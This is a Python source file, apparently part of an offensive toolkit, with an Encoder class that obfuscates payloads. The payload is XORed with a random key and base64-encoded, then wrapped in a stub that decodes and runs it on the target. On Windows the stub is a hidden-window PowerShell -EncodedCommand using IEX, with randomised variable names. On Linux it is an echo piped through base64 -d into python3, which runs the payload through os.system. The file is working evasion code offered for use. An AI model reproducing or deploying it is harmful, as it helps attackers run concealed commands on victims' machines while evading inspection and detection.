import base64
import os
import random
import string


class Encoder:
    """XOR + base64 + self-decoding stub encoder for payload obfuscation."""

    @staticmethod
    def encode(payload: str, target_os: str) -> str:
        xor_key = os.urandom(1)[0] or 0x41
        payload_bytes = payload.encode()
        xored = bytes(b ^ xor_key for b in payload_bytes)
        b64 = base64.b64encode(xored).decode()

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            return Encoder._wrap_ps_decoder(b64, xor_key)
        else:
            return Encoder._wrap_linux_decoder(b64, xor_key)

    @staticmethod
    def _rand_var(length: int = 6) -> str:
        return random.choice(string.ascii_lowercase) + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=length - 1)
        )

    @staticmethod
    def _wrap_ps_decoder(b64_payload: str, xor_key: int) -> str:
        v_enc = Encoder._rand_var()
        v_key = Encoder._rand_var()
        v_dec = Encoder._rand_var()
        v_bytes = Encoder._rand_var()
        v_i = Encoder._rand_var()

        ps_script = (
            f'${v_enc}="{b64_payload}";'
            f"${v_key}={xor_key};"
            f"${v_bytes}=[Convert]::FromBase64String(${v_enc});"
            f"${v_dec}=New-Object byte[] ${v_bytes}.Length;"
            f"for(${v_i}=0;${v_i} -lt ${v_bytes}.Length;${v_i}++)"
            f"{{${v_dec}[${v_i}]=${v_bytes}[${v_i}] -bxor ${v_key}}};"
            f"IEX([System.Text.Encoding]::UTF8.GetString(${v_dec}))"
        )
        encoded = base64.b64encode(ps_script.encode("utf-16le")).decode()
        return (
            "powershell -NoProfile -WindowStyle Hidden "
            f"-EncodedCommand {encoded}"
        )

    @staticmethod
    def _wrap_linux_decoder(b64_payload: str, xor_key: int) -> str:
        # Build the decoder as a standalone Python script
        decoder_script = (
            f"import base64,os\n"
            f"d=base64.b64decode('{b64_payload}')\n"
            f"os.system(bytes(c^{xor_key} for c in d).decode())\n"
        )
        # Base64-encode the whole script and pipe to python3 —
        # avoids ALL bash quoting/escaping issues (same approach as _wrap_bash)
        encoded = base64.b64encode(decoder_script.encode()).decode()
        return f"echo {encoded} | base64 -d | python3"
